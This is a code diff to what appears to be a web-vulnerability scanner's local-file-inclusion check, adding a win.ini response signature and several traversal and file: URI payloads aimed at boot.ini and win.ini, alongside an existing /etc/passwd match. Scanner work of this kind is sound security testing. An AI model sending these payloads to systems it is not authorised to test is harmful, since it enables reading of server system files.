@@ -26,6 +26,8 @@ var checkResponse = function(ctx, currentIndex) {
 	} else {
 		var passwdMatch = /root:.:0:0/; 
 		var bootiniMatch = "[boot loader]";
+		var wininiMatch = "; for 16-bit app support";
+		
 		var javaMatch = "<web-app";
 		if (passwdMatch.test(ctx.getSavedResponse(currentIndex).bodyAsString)) {
 			ctx.addRegexCaseInsensitiveHighlight("root:.:0:0");
@@ -36,6 +38,13 @@ var checkResponse = function(ctx, currentIndex) {
 			return result;
 		} else if (ctx.getSavedResponse(currentIndex).bodyAsString.indexOf(bootiniMatch) >= 0) {
 			ctx.addStringHighlight(bootiniMatch);
+			var result = {
+					detected: true,
+					type: "lfi"
+			};
+			return result;
+		} else if (ctx.getSavedResponse(currentIndex).bodyAsString.indexOf(wininiMatch) >= 0) {
+			ctx.addStringHighlight(wininiMatch);
 			var result = {
 					detected: true,
 					type: "lfi"
@@ -172,7 +181,12 @@ alteredRequests.push({
 // Windows
 
 alteredRequests.push({
-	payload: "c:\\boot.ini",
+	payload: "C:\\boot.ini",
+	type: "Windows"
+});
+
+alteredRequests.push({
+	payload: "C:/boot.ini",
 	type: "Windows"
 });
 
@@ -181,6 +195,43 @@ alteredRequests.push({
 	type: "Windows"
 });
 
+alteredRequests.push({
+	payload: "file:/C:/boot.ini",
+	type: "Windows"
+});
+
+alteredRequests.push({
+	payload: "file:/C:\\boot.ini",
+	type: "Windows"
+});
+
+alteredRequests.push({
+	payload: "file:/boot.ini",
+	type: "Windows"
+});
+
+alteredRequests.push({
+	payload: "C:/windows/win.ini"
+});
+
+alteredRequests.push({
+	payload: "C:\\windows\\win.ini"
+});
+
+alteredRequests.push({
+	payload: "file:/C:/windows/win.ini",
+	type: "Windows"
+});
+
+alteredRequests.push({
+	payload: "file:/C:/windows/win.ini",
+	type: "Windows"
+});
+
+alteredRequests.push({
+	payload: sequenceGenerator(12, "Windows") + "/windows/win.ini",
+	type: "Windows"
+});
 
 // Tomcat
 
